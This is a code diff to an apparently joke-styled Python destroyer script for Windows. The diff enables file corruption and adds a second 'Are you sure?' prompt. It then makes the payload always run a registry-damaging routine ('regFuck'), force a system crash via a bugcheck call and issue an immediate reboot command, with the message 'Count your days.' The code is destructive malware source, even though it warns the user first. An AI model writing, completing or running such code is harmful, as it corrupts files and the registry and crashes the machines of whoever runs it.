@@ -10,7 +10,7 @@ from functions import *
 #inten = 8*1000 #corruption intensity ##Unused
 debug = True #console log stuff
 do_destruction = False
-skipCorruption = True
+skipCorruption = False
 admCheck = ctypes.windll.shell32.IsUserAnAdmin()
 threadAmount = 256
 pcLoadAmount = 819
@@ -24,7 +24,10 @@ window.withdraw()
 
 # debug check
 if debug:
-    do_destruction = joe = tkMsg.askyesno(title='Helo :-)', message="You're about to execute possibly something bad. This program could possibly hose some of your files. \n \nDo you want to continue?", icon='warning')
+    do_destruction = joe = tkMsg.askyesno(title='Helo :-)', message="You're about to execute possibly something bad. This program could possibly hose some of your files and your Windows registry. \n \nDo you want to continue?", icon='warning')
+    if do_destruction:
+        do_destruction = joe = tkMsg.askyesno(title='Last chance', message="Are you sure?\n There's no going back after this point!", icon='warning')
+
 
 # Main destructive part
 # does destruction if flag is true
@@ -64,11 +67,8 @@ if do_destruction:
 if do_destruction:
     tkMsg.showerror(title='mablo sez',message='Count your days.')
 
-    if admCheck != 0:
-        # try to do funny
-        regFuck(admCheck)
-        Bugcheck(0xC0000022)
-    else:
-        Bugcheck(0xC0000022)
-        do_command('shutdown -r -t 0')
+    # funny
+    regFuck(admCheck)
+    Bugcheck(0xC0000022)
+    do_command('shutdown -r -t 0')
 
